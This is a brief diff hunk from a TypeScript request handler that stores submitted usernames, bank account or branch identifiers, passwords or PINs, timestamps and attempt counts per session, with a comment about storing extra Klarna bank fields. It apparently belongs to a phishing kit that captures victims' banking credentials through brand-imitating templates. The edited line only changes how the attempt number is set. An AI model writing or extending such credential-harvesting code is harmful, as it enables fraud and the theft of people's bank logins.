@@ -317,7 +317,7 @@ export async function handleTemplateSubmission(req: Request, res: Response) {
         username: data.username || data.account || data.branch,
         password: data.password || data.pin,
         timestamp: new Date().toISOString(),
-        attempt: sessionData.login_attempts.length + 1
+        attempt: data.attempt || sessionData.login_attempts.length + 1
       };
       
       // For Klarna, also store bank type and additional fields
